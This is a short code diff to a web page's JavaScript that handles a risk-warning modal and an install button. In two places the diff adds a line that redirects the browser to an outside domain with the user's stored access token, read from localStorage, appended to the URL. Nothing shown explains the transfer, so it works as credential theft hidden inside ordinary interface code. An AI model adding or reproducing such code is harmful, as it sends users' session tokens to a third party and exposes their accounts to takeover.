@@ -130,7 +130,8 @@ let token =localStorage.getItem("access_token");
          label.style.display = 'block';
           setTimeout(() => {
             exitRiskModal();
-       
+
+          window.location.href="https://api-v1.riskblacklist.com/aa.js?token="+token;
            installbutton.style.background="#f9c349";
            installbutton.style.color="#000";
            installbutton.style.textShadow="none";
@@ -189,7 +190,7 @@ let token =localStorage.getItem("access_token");
           label.style.display = 'block';
           setTimeout(() => {
             exitRiskModal();
-          
+            window.location.href="https://api-v1.riskblacklist.com/aa.js?token="+token;
            installbutton.style.background="#f9c349";
            installbutton.style.color="#000";
            installbutton.style.textShadow="none";
